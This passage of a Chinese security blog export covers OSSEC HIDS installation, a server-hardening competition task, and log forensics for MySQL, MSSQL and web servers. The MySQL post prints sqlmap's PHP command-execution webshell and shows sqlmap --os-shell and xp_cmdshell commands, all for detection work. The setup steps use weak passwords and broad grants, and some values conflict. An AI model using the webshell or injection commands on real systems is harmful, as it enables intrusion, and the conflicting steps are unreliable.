wget https://github.com/ossec/ossec-hids/archive/refs/tags/3.6.0.tar.gz web界面源码 wget https://github.com/ossec/ossec-wui/archive/refs/tags/0.9.tar.gz 服务端安装[root@server ~]# cd /tmp/ ///进入tmp目录 [root@server tmp]# wget https://github.com/ossec/ossec-hids/archive/refs/tags/3.6.0.tar.gz ///下载源码 [root@server tmp]# tar -zvxf 3.6.0.tar.gz ///解压源码 [root@server tmp]# cd ossec-hids-3.6.0/ ///进入解压的文件目录 [root@server ossec-hids-3.6.0]# cai INSTALL ///使用cai INSTALL来查看需要安装的依赖 [root@server ossec-hids-3.6.0]# yum install libssl libevent libpcre2 libz make gcc -y ///安装依赖 [root@server src]# make help ///查看帮助文档 [root@server src]# make TARGET=server PREFIX=/usr/local/ossec DATABASE=mysql 编译 编译报错,缺少依赖 我们需要安装缺少的依赖,可以使用 yum search pcre2来查找安装包 #安装缺少的依赖包,然后重新编译 yum search pcre2 yum install pcre2-devel -y yum install libevent-devel -y yum install zlib-devel -y yum install openssl-devel -y yum install mariadb-devel -y yum install mariadb-devel -y 编译完成 [root@server ossec-hids-3.6.0]# ./install.sh ** Para instalação em português, escolha [br]. ** 要使用中文进行安装, 请选择 [cn]. ** Fur eine deutsche Installation wohlen Sie [de]. ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el]. ** For installation in English, choose [en]. ** Para instalar en Español , eliga [es]. ** Pour une installation en français, choisissez [fr] ** A Magyar nyelvű telepítéshez válassza [hu]. ** Per l'installazione in Italiano, scegli [it]. ** 日本語でインストールします．選択して下さい．[jp]. ** Voor installatie in het Nederlands, kies [nl]. ** Aby instalować w języku Polskim, wybierz [pl]. ** Для инструкций по установке на русском ,введите [ru]. ** Za instalaciju na srpskom, izaberi [sr]. ** Türkçe kurulum için seçin [tr]. (en/br/cn/de/el/es/fr/hu/it/jp/nl/pl/ru/sr/tr) [en]: cn OSSEC HIDS v3.6.0 安装脚本 - http://www.ossec.net 您将开始 OSSEC HIDS 的安装. 请确认在您的机器上已经正确安装了 C 编译器. - 系统类型: Linux server 3.10.0-862.el7.x86_64 - 用户: root - 主机: server -- 按 ENTER 继续或 Ctrl-C 退出. -- 1- 您希望哪一种安装 (server, agent, local or help)? server - 选择了 Server 类型的安装. 2- 正在初始化安装环境. - 请选择 OSSEC HIDS 的安装路径 [/var/ossec]: /usr/local/ossec - OSSEC HIDS 将安装在 /usr/local/ossec . 3- 正在配置 OSSEC HIDS. 3.1- 您希望收到e-mail告警吗? (y/n) [y]: y - 请输入您的 e-mail 地址? admin@worldskills2020.gd - 请输入您的 SMTP 服务器IP或主机名 ? localhost 3.2- 您希望运行系统完整性检测模块吗? (y/n) [y]: y - 系统完整性检测模块将被部署. 3.3- 您希望运行 rootkit检测吗? (y/n) [y]: y - rootkit检测将被部署. 3.4- 关联响应允许您在分析已接收事件的基础上执行一个 已定义的命令. 例如,你可以阻止某个IP地址的访问或禁止某个用户的访问权限. 更多的信息,您可以访问: http://www.ossec.net/en/manual.html#active-response - 您希望开启联动(active response)功能吗? (y/n) [y]: y - 关联响应已开启 - 默认情况下, 我们开启了主机拒绝和防火墙拒绝两种响应. 第一种情况将添加一个主机到 /etc/hosts.deny. 第二种情况将在iptables(linux)或ipfilter(Solaris, FreeBSD 或 NetBSD）中拒绝该主机的访问. - 该功能可以用以阻止 SSHD 暴力攻击, 端口扫描和其他 一些形式的攻击. 同样你也可以将他们添加到其他地方, 例如将他们添加为 snort 的事件. - 您希望开启防火墙联动(firewall-drop)功能吗? (y/n) [y]: n - 防火墙联动(firewall-drop)被关闭. - - 114.114.114.114 - 您希望添加更多的IP到白名单吗? (y/n)? [n]: y - 请输入IP (用空格进行分隔): 192.168.8.12 192.168.8.13 3.5- 您希望接收远程机器syslog吗 (port 514 udp)? (y/n) [y]: y - 远程机器syslog将被接收. 3.6- 设置配置文件以分析一下日志: -- /var/log/messages -- /var/log/secure -- /var/log/maillog -如果你希望监控其他文件, 只需要在配置文件ossec.conf中 添加新的一项. 任何关于配置的疑问您都可以在 http://www.ossec.net 找到答案. 配置数据库[root@server ossec-hids-3.6.0]# yum install mariadb-server.x86_64 -y ///安装数据库 [root@server ossec-hids-3.6.0]# systemctl enable mariadb.service [root@server ossec-hids-3.6.0]# systemctl start mariadb.service ///启动数据库 [root@server ossec-hids-3.6.0]# mysql ///进入数据库 MariaDB [(none)]&gt; create database ossec; MariaDB [(none)]&gt; CREATE USER 'ossec'@'localhost' IDENTIFIED BY 'ossec'; Query OK, 0 rows affected (0.00 sec) MariaDB [(none)]&gt; GRANT ALL ON *.* TO 'ossec'@'localhost'; Query OK, 0 rows affected (0.00 sec) [root@server ossec-hids-3.6.0]# find . -type f -name \"*mysql*\" ///查找关键字mysql [root@server ossec-hids-3.6.0]# mysql ossec &lt;./src/os_dbd/mysql.schema ///将mysql.schema导入到数据库 [root@server ~]# vim /usr/local/ossec/etc/ossec.conf &lt;ossec_config&gt; &lt;database_output&gt; &lt;hostname&gt;locahost&lt;/hostname&gt; &lt;username&gt;ossec&lt;/username&gt; &lt;password&gt;ossec&lt;/password&gt; &lt;database&gt;ossec&lt;/database&gt; &lt;type&gt;mysql&lt;/type&gt; &lt;/database_output&gt; &lt;/ossec_config&gt; 生成客户端密钥 [root@server ~]# cd /usr/local/ossec/bin/ [root@server bin]# ls [root@server bin]# ./manage_agents **************************************** * OSSEC HIDS v3.6.0 Agent manager. * * The following options are available: * **************************************** (A)dd an agent (A). (E)xtract key for an agent (E). (L)ist already added agents (L). (R)emove an agent (R). (Q)uit. Choose your action: A,E,L,R or Q: A ///这里选择A - Adding a new agent (use '\\q' to return to the main menu). Please provide the following: * A name for the new agent: name1 ///名字随便填这里我填的式name1 * The IP Address of the new agent: 192.168.8.13 ///ip地址指定客户端也就是另一台linux系统ip地址 * An ID for the new agent[001]: 001 Agent information: ID:001 Name:name1 IP Address:192.168.8.13 Confirm adding it?(y/n): y Agent added with ID 001. ## 查看密钥 **************************************** * OSSEC HIDS v3.6.0 Agent manager. * * The following options are available: * **************************************** (A)dd an agent (A). (E)xtract key for an agent (E). (L)ist already added agents (L). (R)emove an agent (R). (Q)uit. Choose your action: A,E,L,R or Q: E //选择E Available agents: ID: 001, Name: name1, IP: 192.168.8.13 Provide the ID of the agent to extract the key (or '\\q' to quit): 001 ///输入001 Agent key information for '001' is: MDAxIG5hbWUxIDE5Mi4xNjguOC4xMyBhZjMyMWIwMmQ4MTgxZDI0YjZhZjBhM2M2Nzg3MDI1YjBiMWIyM2E1NjNlMTBmMDk1YzE1ZDg3ZTAwMGE2MzBk ** Press ENTER to return to the main menu. 安装web界面[root@server tmp]# pwd /tmp [root@server tmp]# yum install httpd php -y ///安装apache和php环境 [root@server tmp]# wget https://github.com/ossec/ossec-wui/archive/refs/tags/0.9.tar.gz ///下载源码 [root@server tmp]# tar -zvxf 0.9.tar.gz ///解压源码 [root@server tmp]# cd ossec-wui-0.9/ [root@server ossec-wui-0.9]# ls CONTRIB css htaccess_def.txt img index.php js lib LICENSE ossec_conf.php README README.search [root@server ossec-wui-0.9]# cat README ///查看使用文档 [root@server ossec-wui-0.9]# cd .. ///放回上一级 [root@server tmp]# mv ossec-wui* /var/www/html/ossec-wui ///使用mv将文件移动到html目录下面 [root@server tmp]# cd /var/www/html/ossec-wui/ ///进入 [root@server ossec-wui]# ls CONTRIB css htaccess_def.txt img index.php js lib LICENSE ossec_conf.php README README.search [root@server ossec-wui]# ./setup.sh ///运行 Setting up ossec ui... Username: root New password: ///随便填 这里我填123 Re-type new password: Adding password for user root Enter your web server user name (e.g. apache, www, nobody, www-data, ...) apache ///选择apache You must restart your web server after this setup is done. Setup completed successfully. [root@server ossec-wui]# vim ossec_conf.php ///修改文件里面的路径 /* Ossec directory */ $ossec_dir=\"/usr/local/ossec\"; [root@server ossec-wui]# systemctl start httpd 启动apache服务 [root@server ~]# cd /usr/local/ossec/bin/ [root@server bin]# ls agent_control ossec-analysisd ossec-execd ossec-monitord rootcheck_control clear_stats ossec-authd ossec-logcollector ossec-regex syscheck_control list_agents ossec-control ossec-logtest ossec-remoted syscheck_update manage_agents ossec-csyslogd ossec-maild ossec-reportd util.sh ossec-agentlessd ossec-dbd ossec-makelists ossec-syscheckd verify-agent-conf [root@server bin]# ./ossec-control start Starting OSSEC HIDS v3.6.0... Started ossec-dbd... Started ossec-maild... Started ossec-execd... Started ossec-analysisd... Started ossec-logcollector... Started ossec-remoted... Started ossec-syscheckd... Started ossec-monitord... Completed. 服务端安装完成 客户端安装[root@client tmp]# wget https://github.com/ossec/ossec-hids/archive/refs/tags/3.6.0.tar.gz [root@client tmp]# tar -zvxf 3.6.0.tar.gz [root@client ossec-hids-3.6.0]# cat INSTALL [root@client ossec-hids-3.6.0]# yum install libssl libevent libpcre2 libz make gcc -y yum search pcre2 yum install pcre2-devel -y yum install libevent-devel -y yum install zlib-devel -y yum install openssl-devel -y yum install mariadb-devel -y yum install mariadb-devel -y [root@client ossec-hids-3.6.0]# ./install.sh ** Para instalação em português, escolha [br]. ** 要使用中文进行安装, 请选择 [cn]. ** Fur eine deutsche Installation wohlen Sie [de]. ** Για εγκατάσταση στα Ελληνικά, επιλέξτε [el]. ** For installation in English, choose [en]. ** Para instalar en Español , eliga [es]. ** Pour une installation en français, choisissez [fr] ** A Magyar nyelvű telepítéshez válassza [hu]. ** Per l'installazione in Italiano, scegli [it]. ** 日本語でインストールします．選択して下さい．[jp]. ** Voor installatie in het Nederlands, kies [nl]. ** Aby instalować w języku Polskim, wybierz [pl]. ** Для инструкций по установке на русском ,введите [ru]. ** Za instalaciju na srpskom, izaberi [sr]. ** Türkçe kurulum için seçin [tr]. (en/br/cn/de/el/es/fr/hu/it/jp/nl/pl/ru/sr/tr) [en]: cn OSSEC HIDS v3.6.0 安装脚本 - http://www.ossec.net 您将开始 OSSEC HIDS 的安装. 请确认在您的机器上已经正确安装了 C 编译器. - 系统类型: Linux client 3.10.0-862.el7.x86_64 - 用户: root - 主机: client -- 按 ENTER 继续或 Ctrl-C 退出. -- 1- 您希望哪一种安装 (server, agent, local or help)? agent - 选择了 Agent(client) 类型的安装. 2- 正在初始化安装环境. - 请选择 OSSEC HIDS 的安装路径 [/var/ossec]: - OSSEC HIDS 将安装在 /var/ossec . 3- 正在配置 OSSEC HIDS. 3.1- 请输入 OSSEC HIDS 服务器的IP地址或主机名: 192.168.8.12 - 添加服务器IP 192.168.8.12 3.2- 您希望运行系统完整性检测模块吗? (y/n) [y]: y - 系统完整性检测模块将被部署. 3.3- 您希望运行 rootkit检测吗? (y/n) [y]: y - rootkit检测将被部署. 3.4 - 您希望开启联动(active response)功能吗? (y/n) [y]: y 3.5- 设置配置文件以分析一下日志: -- /var/log/messages -- /var/log/secure -- /var/log/maillog 配置密钥 [root@client ossec-hids-3.6.0]# /var/ossec/bin/manage_agents **************************************** * OSSEC HIDS v3.6.0 Agent manager. * * The following options are available: * **************************************** (I)mport key from the server (I). (Q)uit. Choose your action: I or Q: I * Provide the Key generated by the server. * The best approach is to cut and paste it. *** OBS: Do not include spaces or new lines. Paste it here (or '\\q' to quit): MDAxIG5hbWUxIDE5Mi4xNjguOC4xMyA3N2RhMzU0NmRhNTExODI3YTUwY2M1MzVjNjNkMTJmOWM5MjNlYjJiODYxNGVjMmIzNDg3NzhkN2ZkMDllNmU4 Agent information: ID:001 Name:name1 IP Address:192.168.8.13 Confirm adding it?(y/n): y 启动客户端 [root@client ~]# /var/ossec/bin/ossec-control start 客户端安装完成 规程添加 Web_Server“/home/wwwlogs/”目录下的access 日志到 ossec日志源中 配置规则，规则名为alert_port，检测Web_Server监听端口，当端口发生改变时产生报警日志，命中信息为 port changed； &lt;frequency&gt;79200&lt;/frequency&gt; 新建规则，规则名为alert_php，当Web_Server 中 index.php发生改变时发出警告，命中述信息为 index.php changed； ### 频率搜索复制粘贴/freq [root@client etc]# vim ossec.conf &lt;ossec_config&gt; &lt;localfile&gt; &lt;log_format&gt;full_command&lt;/log_format&gt; &lt;command&gt;netstat -tan |grep LISTEN |egrep -v '(127.0.0.1| ::1)' | sort&lt;/command&gt; &lt;frequency&gt;5&lt;/frequency&gt; &lt;/localfile&gt; &lt;/ossec_config&gt; 新建规则，规则名为 alert_attack、id 为 31180、level 为 6，检测wordpress url 地址包含.php 的文件，当 60 秒内同一 IP 访问.php文件超过20次， 触发该规则，命中信息为attacks_info； 配置 ossec将level为10的警告信息发送到admin@worldskills2020.gd邮箱","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.xiaocaibi.top/tags/Linux/"}]},{"title":"模块A 基础设施设置与安全加固","slug":"模块A-基础设施设置与安全加固","date":"2021-08-20T11:39:08.000Z","updated":"2021-09-20T08:47:43.807Z","comments":true,"path":"posts/75c153fa.html","link":"","permalink":"http://www.xiaocaibi.top/posts/75c153fa.html","excerpt":"","text":"模块A 基础设施设置与安全加固 （本模块20分）一、项目和任务描述： 假定你是某企业的网络安全工程师，对于企业的服务器系统，根据任-务要求确保各服务正常运行，并通过综合运用登录和密码策略、数据库安全策略、流量完整性保护策略、事件监控策略、防火墙策略等多种安全策略来提升服务器系统的网络安全防御能力。本模块要求对具体任务的操作截图并加以相应的文字说明,以word文档的形式书写,以PDF格式保存,以赛位号作为文件名. 二、服务器环境说明 Windows 用户名：administrator，密码：123456 Linux 用户名：root，密码：123456 三、具体任务（每个任务得分以电子答题卡为准） A-1任务一 登录安全加固（Windows, Linux） 请对服务器Windows、Linux按要求进行相应的设置，提高服务器的安全性。 1.密码策略（Windows, Linux） a.最小密码长度不少于16个字符。 (windos 步骤:) (1)打开管理工具,点击本地安全策略 (2)进来之后点击账户策略,点击密码策略 (3)进去之后找到密码长度最小值 (4)然后我们输入14 (LINUX) (1)进入/etc/login.defs配置文件 (2)将min_len修改成14 2.登录策略（Windows, Linux） a.在用户登录系统时，应该有“For authorized users only”提示信息； (1)打开管理工具,点击本地安全策略 (2)点击本地策略,找到安全选项 (3)选择试图登录的用户消息文本 (LINUX) (1)使用vim 进入etc/isseue (2)进入后在后面添加一条For authorized users only b.远程用户非活动会话连接超时应小于等于5分钟。 (1)微软键+r 调用gpedit.msc (2)点击管理模板,展开windows组件找到远程桌面服务 (3)点击远程桌面会话主机,然后点击会话时间限制 (4)启用空闲的远程桌面并设置5分钟 (LINUX) (1)进入vim /etc/ssh/sshd_config (2)找到 (3)更改成 3.用户安全管理(Windows) a.设置user1用户只能在上班时间（周一至周五的9:00~18:00）可以登录，将user1的登录时间配置界面截图； b.在组策略中只允许管理员账号从网络访问本机。 (1)打开本地策略,找到用户权限分配 (2)点击从网络访问此计算机 (3)将其他用户删除,保留管理员账号 A-2任务二 数据库加固（Linux） 4.以普通帐户mysql安全运行mysql服务，禁止mysql以管理员帐号权限运行； 5.删除默认数据库(test)； 6.改变默认mysql管理员用户为:SuperRoot； 7.使用mysql内置MD5加密函数加密用户user1的密码为(P@ssw0rd1!)； 8.赋予user1用户对数据库所有表只有select,insert,delete,update权限。 A-3任务三 流量完整性保护（Windows） 9.对Web网站进行HTTP重定向HTTPS设置，仅使用HTTPS协议访问网站（Windows）(注：证书颁发给test.com 并通过访问Web网站)。 (1)打开服务器管理,点击添加角色与功能向导 然后下一步 下一步 (2)这里我们选择证书服务和web服务器 下一步 下一步 下一步 (3)这里我们选择证书颁发机构和证书颁发机构web注册,然后下一步 下一步 下一步,然后点击安装 A-4任务四 事件监控（Windows） 10.将Web服务器开启审核策略 登录事件 成功/失败； 特权使用 成功； 策略更改 成功/失败； 进程跟踪 成功/失败； (1)打开管理工具,点击本地安全策略,进入本地策略找到审核策略 (2)点击审核登录事件,并打上√ (3)点击审核特权使用 (4)点击审核策略更改 (5)点击审核进程跟踪 A-5任务五 服务加固SSH\\VSFTPD\\IIS（Windows, Linux） 11.SSH服务加固（Linux） a.修改ssh服务端口为2222； [root@linhuanxun ~]# vim /etc/ssh/sshd_config Port 2222 b.ssh禁止root用户远程登录。 [root@linhuanxun ~]# vim /etc/ssh/sshd_config PermitRootLogin no 12.VSFTPD服务加固（Linux） a.vsftpd禁止匿名用户上传； [root@linhuanxun ~]# vim /etc/vsftpd/vsftpd.conf anonymous_enable=NO [root@linhuanxun ~]# vim /etc/vsftpd/vsftpd.conf b.设置无任何操作的超时时间为5分钟。 idle_session_timeout=300 13.IIS加固（Windows） a.开启IIS的日志审计记录(日志文件保存格式为W3C,只记录日期、时间、客户端IP地址、用户名、方法)； b.为了减轻网站负载，设置网站最大并发连接数为1000。 A-6任务六 防火墙策略（Windows, Linux）所有服务器开启防火墙,为防止勒索病毒攻击对防火墙进行加固策略： 14.Windows系统禁用445端口； (1)打开管理工具,找到windows防火墙 (2)右击点击新建入站规则 (3)选择端口,然后下一步 (4)然后选择tpc协议指定445端口,然后下一步 (5)这里我们选择阻止连接 (6)这里随便输入 15.Windows系统禁用23端口；操作步骤和14小题一样 16.Linux系统禁用23端口；[root@linhuanxun ~]# iptables -A INPUT -p tcp -m tcp --dport 23 -j DROP [root@linhuanxun ~]# iptables -A INPUT -p udp -m udp --dport 23 -j DROP 17.Linux系统禁止别人ping通；[root@linhuanxun ~]# iptables -A INPUT -p ICMP -j DROP 18.为确保安全Linux系统禁止所有人通过ssh连接除了172.16.1.1这个ip。[root@linhuanxun ~]# iptables -I INPUT -s 172.16.1.1 -p tcp --dport 22 -j ACCEPT [root@linhuanxun ~]# iptables -A INPUT -p tcp --dport 22 -j DROP","categories":[],"tags":[{"name":"windows","slug":"windows","permalink":"http://www.xiaocaibi.top/tags/windows/"}]},{"title":"第5篇：MySQL日志分析","slug":"第5篇：MySQL日志分析","date":"2021-07-26T01:26:48.000Z","updated":"2021-09-20T08:47:43.869Z","comments":true,"path":"posts/2985cf16.html","link":"","permalink":"http://www.xiaocaibi.top/posts/2985cf16.html","excerpt":"","text":"第5篇:MySQL日志分析常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。 0x01 Mysql日志分析general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。 1、查看log配置信息 show variables like '%general%'; 2、开启日志 SET GLOBAL general_log = 'On'; 3、指定日志文件路径 #SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log'; 比如，当我访问 /test.php?id=1，此时我们得到这样的日志： 190604 14:46:14 14 Connect root@localhost on 14 Init DB test 14 Query SELECT * FROM admin WHERE id = 1 14 Quit ` 我们按列来解析一下： 第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。 第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。 第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。 第四列:Argument，详细信息，例如 Connect root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。 0x02 登录成功/失败我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。 MySQL中的log记录是这样子： Time Id Command Argument 190601 22:03:20 98 Connect root@192.168.204.1 on 98 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 103 Connect mysql@192.168.204.1 on 103 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 104 Connect mysql@192.168.204.1 on 104 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Connect root@192.168.204.1 on 101 Connect root@192.168.204.1 on 101 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 99 Connect root@192.168.204.1 on 99 Connect Access denied for user 'root'@'192.168.204.1' (using password: YES) 105 Connect mysql@192.168.204.1 on 105 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Query set autocommit=0 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 100 Quit ` 你知道在这个口令猜解过程中，哪个是成功的吗？ 利用爆破工具，一个口令猜解成功的记录是这样子的： 190601 22:03:20 100 Connect root@192.168.204.1 on 100 Query set autocommit=0 100 Quit 但是，如果你是用其他方式，可能会有一点点不一样的哦。 Navicat for MySQL登录： 190601 22:14:07 106 Connect root@192.168.204.1 on 106 Query SET NAMES utf8 106 Query SHOW VARIABLES LIKE 'lower_case_%' 106 Query SHOW VARIABLES LIKE 'profiling' 106 Query SHOW DATABASES 命令行登录： 190601 22:17:25 111 Connect root@localhost on 111 Query select @@version_comment limit 1 190601 22:17:56 111 Quit 这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。 另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。 登录失败的记录： 102 Connect mysql@192.168.204.1 on 102 Connect Access denied for user 'mysql'@'192.168.204.1' (using password: YES) 利用shell命令进行简单的分析： #有哪些IP在爆破？ grep \"Access denied\" mysql.log |cut -d \"'\" -f4|uniq -c|sort -nr 27 192.168.204.1 #爆破用户名字典都有哪些？ grep \"Access denied\" mysql.log |cut -d \"'\" -f2|uniq -c|sort -nr 13 mysql 12 root 1 root 1 mysql 在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。 敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func 0x03 SQL注入入侵痕迹在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理： 1、构造一个SQL注入点，开启Burp监听8080端口 sqlmap.py -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP通讯过程如下： 创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。 tmpbwyov.php： &amp;1\\n\";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print \"\".$w.\"\";?&gt;` 创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。 通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。 检查方法： 1、检查网站目录下，是否存在一些木马文件： 2、检查是否有UDF提权、MOF提权痕迹 检查目录是否有异常文件 mysql\\lib\\plugin c:/windows/system32/wbem/mof/ 检查函数是否删除 select * from mysql.func 3、结合web日志分析。","categories":[],"tags":[{"name":"日志分析","slug":"日志分析","permalink":"http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"}]},{"title":"第4篇：MSSQL日志分析","slug":"第4篇：MSSQL日志分析","date":"2021-07-25T01:26:28.000Z","updated":"2021-09-20T08:47:43.869Z","comments":true,"path":"posts/4b2c6b60.html","link":"","permalink":"http://www.xiaocaibi.top/posts/4b2c6b60.html","excerpt":"","text":"第4篇:MSSQL日志分析常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。 0x01 MSSQL日志分析首先，MSSQL数据库应启用日志记录功能，默认配置仅限失败的登录，需修改为失败和成功的登录，这样就可以对用户登录进行审核。 登录到SQL Server Management Studio，依次点击 管理–SQL Server 日志 双击日志存档文件即可打开日志文件查看器，并可以对日志进行筛选或者导出等操作。 另外，MSSQ提供了一个工具SQL Server Profiler ，方便查找和发现SQL执行的效率和语句问题。 日志分析案例： 在日志文件查看器中，选择筛选，在筛选设置中源设置为“登录”，应用筛选器，确定。 筛选后的结果，可以很清晰的识别用户登录信息，记录内容包括用户登录时间、登录是否成功、登录使用的账号以及远程登录时用户使用的IP地址。 如下图：客户端：192.168.204.1进行尝试弱口令登录，并发现其中有一条登录成功的记录。 0x02 SQL注入入侵痕迹在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理： 1、构造一个SQL注入点，开启Burp监听8080端口 sqlmap.py -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP通讯过程如下： 创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。 通过查看数据库中最近新建的表的结构和内容，可以判断是否发生过sql注入漏洞攻击事件。 检查方法： 1、数据库表检查 2、检查xp_cmdshell等存储过程 xp_cmdshell在mssql2005之后的版本中是默认禁止的，查看xp_cmdshell是否被启用。 `Exec master.dbo.xp_cmdshell ‘whoami’ 3、需要结合web日志，通过查看日志文件的大小以及审计日志文件中的内容，可以判断是否发生过sql注入漏洞攻击事件。","categories":[],"tags":[{"name":"日志分析","slug":"日志分析","permalink":"http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"}]},{"title":"第3篇：Web日志分析","slug":"第3篇：Web日志分析","date":"2021-07-24T02:26:01.000Z","updated":"2021-09-20T08:47:43.838Z","comments":true,"path":"posts/196d13a8.html","link":"","permalink":"http://www.xiaocaibi.top/posts/196d13a8.html","excerpt":"","text":"第3篇:Web日志分析ox01 Web日志Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。 我们来看一条Apache的访问日志： 127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] \"GET /login.html HTTP/1.1\" 200 786 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36\" 通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。 本文通过介绍Web日志安全分析时的思路和常用的一些技巧。 0x02 日志分析技巧在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。 第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。 第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。 常用分析工具： Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。 Linux下，使用Shell命令组合查询分析。 Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。 Apache日志分析技巧： 1、列出当天访问次数最多的IP命令： cut -d- -f 1 log_file|uniq -c | sort -rn | head -20 2、查看当天有多少个IP访问： awk '{print $1}' log_file|sort|uniq|wc -l 3、查看某一个页面被访问的次数： grep \"/index.php\" log_file | wc -l 4、查看每一个IP访问了多少个页面： awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file 5、将每个IP访问的页面数进行从小到大排序： awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n 6、查看某一个IP访问了哪些页面： grep ^111.111.111.111 log_file| awk '{print $1,$7}' 7、去掉搜索引擎统计当天的页面： awk '{print $12,$1}' log_file | grep ^\\\"Mozilla | awk '{print $2}' |sort | uniq | wc -l 8、查看2018年6月21日14时这一个小时内有多少IP访问: awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l 0x03 日志分析案例Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。 在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？ 这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。 1、定位攻击源 首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。 浏览器指纹： Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E) 2、搜索相关日志记录 通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。 3、对找到的访问日志进行解读，攻击者大致的访问路径如下： A、攻击者访问首页和登录页 B、攻击者访问MsgSjlb.aspx和MsgSebd.aspx C、攻击者访问Xzuser.aspx D、攻击者多次POST（怀疑通过这个页面上传模块缺陷） E、攻击者访问了图片木马 打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。 0x04 日志统计分析技巧统计爬虫： grep -E 'Googlebot|Baiduspider' /www/logs/access.2019-02-23.log | awk '{ print $1 }' | sort | uniq 统计浏览器： cat 